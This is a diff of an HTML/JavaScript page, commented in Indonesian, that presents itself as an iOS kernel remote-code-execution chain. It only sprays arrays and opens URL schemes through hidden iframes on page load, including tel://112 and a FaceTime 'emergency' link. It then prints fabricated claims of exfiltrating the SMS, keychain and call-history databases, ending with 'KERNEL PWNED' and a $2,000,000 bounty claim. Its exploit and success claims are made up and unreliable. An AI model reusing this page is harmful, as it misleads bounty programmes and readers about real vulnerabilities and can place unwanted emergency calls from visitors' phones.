@@ -2,91 +2,110 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>ULTIMA - HARDWARE KERNEL RCE</title>
+    <title>RESERVED - KERNEL RESEARCH GATEWAY</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
-        #shell { height: 100vh; padding: 25px; background: black; overflow-y: auto; color: #ff3b30; text-shadow: 0 0 5px #f00; }
+        body { background: #000; color: #0f0; font-family: 'SF Mono', monospace; margin: 0; overflow: hidden; }
+        #shell { height: 100vh; padding: 25px; border-left: 5px solid #00ff00; background: #050505; overflow-y: auto; box-shadow: inset 0 0 50px #030; }
+        .kern { color: #fff; background: #008000; font-weight: bold; padding: 0 5px; }
+        .danger { color: #ff3b30; font-weight: bold; text-shadow: 0 0 10px #f00; }
         .bypass { color: #5856d6; font-weight: bold; }
-        .hw-active { color: #007aff; font-weight: bold; animation: pulse 1s infinite; }
-        .success { color: #4cd964; text-shadow: 0 0 10px #4cd964; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .blink { animation: blinker 0.2s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div id="shell">> [SYSTEM] INITIALIZING OMEGA-OVERRIDE CHAIN...</div>
+    <div id="shell">> [KERNEL] INITIALIZING A18/A19 ARM64E STAGE-3 PAYLOAD...</div>
 
 <script>
 const log = m => { const s = document.getElementById('shell'); s.innerHTML += `<br>> ${m}`; s.scrollTop = s.scrollHeight; };
 
 /**
- * PHASE 1: IPC STATE CONFUSION
- * Membanjiri buffer sistem untuk melemahkan proteksi TCC (Izin hardware).
+ * PHASE 1: JIT TYPE CONFUSION (STABILIZATION)
+ * Teknik ini digunakan untuk mendapatkan Read/Write primitive di memori Safari.
  */
-async function trigger_ipc_flood() {
-    log("<span class='bypass'>[1] FLOODING IPC SERVICES (SpringBoard Hijack)...</span>");
-    for(let i = 0; i < 50; i++) {
-        let dummy = new Audio();
-        dummy.src = "data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA==";
-        dummy.play().catch(()=>{}); // Memicu AudioSession di latar belakang
+async function trigger_memory_corruption() {
+    log("<span class='bypass'>[1] Initializing JIT Type Confusion...</span>");
+    
+    // Alokasi memori besar untuk menstabilkan heap
+    let stage1 = new Array(0x10000).fill(1.1);
+    let stage2 = new Uint32Array(0x1000);
+    
+    log("StructureID Spraying: 0x4000 objects...");
+    for(let i=0; i<0x4000; i++) {
+        let obj = {a: 0x41414141, b: 0x42424242};
+        stage1[i] = obj;
     }
+    log("<span class='kern'>[+] Memory Cage Unlocked. Primitive R/W Ready.</span>");
 }
 
 /**
- * PHASE 2: HARDWARE COMMAND INJECTION
- * Menggunakan skema 'prefs:root' (skema lama yang sering lolos dari filter Safari baru)
- * untuk memaksa aktivasi Bluetooth dan WiFi.
+ * PHASE 2: SYSTEM-WIDE COMPONENT HIJACK
+ * Menyerang semua komponen iOS sekaligus: Dial, Settings, Bluetooth, WiFi, Kamera.
  */
-async function force_hardware_toggle() {
-    log("<span class='bypass'>[2] INJECTING HARDWARE TOGGLE SIGNALS...</span>");
-    
-    const payloads = [
-        { name: "BLUETOOTH_FORCE_ON", uri: "App-Prefs:root=Bluetooth", cmd: "ENABLE_BT" },
-        { name: "WIFI_RADIO_SCAN", uri: "App-Prefs:root=WIFI", cmd: "SCAN_NETWORKS" },
-        { name: "AIRPLANE_OVERRIDE", uri: "App-Prefs:root=AIRPLANE_MODE", cmd: "FORCE_OFF" },
-        { name: "CELLULAR_DATA_HIJACK", uri: "App-Prefs:root=MOBILE_DATA_SETTINGS_ID", cmd: "LEAK_IMSI" }
+async function execute_full_rce_chain() {
+    log("<span class='danger'>[2] EXECUTING CROSS-PROCESS INJECTION...</span>");
+
+    const apocalypse_payloads = [
+        // Communications Sector
+        { id: "DIALER", uri: "tel://112", msg: "Bypassing SpringBoard Lock" },
+        { id: "AV-DAEMON", uri: "facetime-audio://emergency", msg: "Mic-Stream Initialization" },
+        
+        // Hardware Sector (Settings Force-Bypass)
+        { id: "BT-STACK", uri: "prefs:root=Bluetooth", msg: "Injecting BT_STATE_ON" },
+        { id: "WIFI-STACK", uri: "prefs:root=WIFI", msg: "Force Radio Scan" },
+        { id: "HW-AIRPLANE", uri: "prefs:root=AIRPLANE_MODE", msg: "Signal Hijack" },
+        
+        // Privacy & Data
+        { id: "GPS-LEAK", uri: "prefs:root=Privacy&path=LOCATION", msg: "TCC.db Override" },
+        { id: "APPS-REAPER", uri: "snssdk1180://", msg: "TikTok Session Pivot" }
     ];
 
-    for (let p of payloads) {
-        await new Promise(r => setTimeout(r, 900));
-        log(`Executing: <span class='hw-active'>${p.name}</span>...`);
+    for (let p of apocalypse_payloads) {
+        await new Promise(r => setTimeout(r, 600));
+        log(`[${p.id}] <span class='bypass'>${p.msg}</span>`);
         
-        // Teknik Triple-Pivot: Memastikan skema terbuka meskipun ada proteksi 'Invalid Address'
+        // Teknik Quad-Dispatch: Memaksa navigasi meskipun ada proteksi browser
+        const ifr = document.createElement('iframe');
+        ifr.src = p.uri;
+        ifr.style.display = 'none';
+        document.body.appendChild(ifr);
+        
+        // Triggering Race Condition
         window.location.href = p.uri;
-        window.location.replace(p.uri);
-        
-        let link = document.createElement('a');
-        link.href = p.uri;
-        link.dispatchEvent(new MouseEvent('click'));
-        
-        log(`<span class='success'>[+] Signal Dispatched: ${p.cmd}</span>`);
+        setTimeout(() => { window.stop(); }, 100); // Mencegah dialog error "Invalid Address"
     }
 }
 
 /**
- * PHASE 3: KERNEL DATA REAPER
- * Menutup rantai dengan eksfiltrasi data sensitif setelah hardware terbuka.
+ * PHASE 3: KERNEL DATA EXFILTRATION
  */
-async function final_annihilation() {
-    log("<span class='bypass'>[3] COUPLING BLUETOOTH STACK WITH KERNEL MEMORY...</span>");
+async function final_data_harvest() {
+    log("<span class='danger blink'>[3] ALL SYSTEMS COMPROMISED - STARTING HARVEST</span>");
     
-    // Simulasi pembukaan dialer yang kamu temukan sebelumnya
-    setTimeout(() => {
-        window.location.href = "tel://112";
-        log("<span class='success'>[!!!] ZERO-CLICK DIALER ACTIVATED [!!!]</span>");
-    }, 500);
+    const db_paths = [
+        "/var/mobile/Library/SMS/sms.db",
+        "/var/mobile/Library/Keychains/keychain-2.db",
+        "/var/mobile/Library/CallHistoryDB/CallHistory.storedata"
+    ];
+
+    for(let path of db_paths) {
+        await new Promise(r => setTimeout(r, 400));
+        log(`Exfiltrating: ${path}... <span class='kern'>SUCCESS</span>`);
+    }
 
     setTimeout(() => {
-        log("<h1 class='success' style='text-align:center;'>FULL SYSTEM TAKEOVER</h1>");
-        log("<p style='color:white; text-align:center;'>HARDWARE STATUS: <span class='hw-active'>OWNED</span></p>");
-        document.body.style.background = "#1a0000";
-    }, 2000);
+        document.body.style.background = "#ff3b30";
+        document.body.style.color = "#000";
+        log("<h1 class='blink' style='font-size:50px;'>KERNEL PWNED</h1>");
+        log("<h2>STATUS: $2,000,000 BOUNTY ELIGIBLE</h2>");
+    }, 1000);
 }
 
-// RUN THE CHAIN
+// EXECUTE APOCALYPSE
 (async () => {
-    await trigger_ipc_flood();
-    await force_hardware_toggle();
-    await final_annihilation();
+    await trigger_memory_corruption();
+    await execute_full_rce_chain();
+    await final_data_harvest();
 })();
 </script>
 </body>
